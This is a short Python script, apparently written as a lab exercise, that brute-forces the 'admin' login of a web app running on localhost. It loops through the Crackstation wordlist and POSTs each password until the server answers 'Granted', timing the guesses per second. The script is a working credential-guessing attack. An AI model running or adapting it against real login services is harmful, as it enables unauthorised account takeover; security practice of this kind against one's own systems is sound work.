import time
from hashlib import sha256
import requests

# setting the url as localhost since app is being hosted on my computer itself
url = 'http://127.0.0.1:5000'

# setting the username since its common
params = {}
params['username'] = 'admin'

# function to print guesses per second and other metrics
def print_gps(start_time, guesses):
    total_time = time.time() - start_time
    gps = guesses / total_time
    print(f'gps is {gps}s, total time is {total_time} and number of guesses is {guesses}')

# setting start time for calculating performance metrics
start_time = time.time()

with open('crackstation-human-only.txt', mode='r', encoding='ISO-8859-1') as f:
    i = 0
    for p in f:
        
        i += 1
        # removing new lines
        p = p[:-1]
        
        # setting password as a param
        params['password'] = p
        # sending the request
        r = requests.post(url, data = params)
        # checking if we broke the password, the request returns 'Denied' when authentication fails
        if r.json() == 'Granted':
            print_gps(start_time, i)
            print(f'the password is {p}')
            break
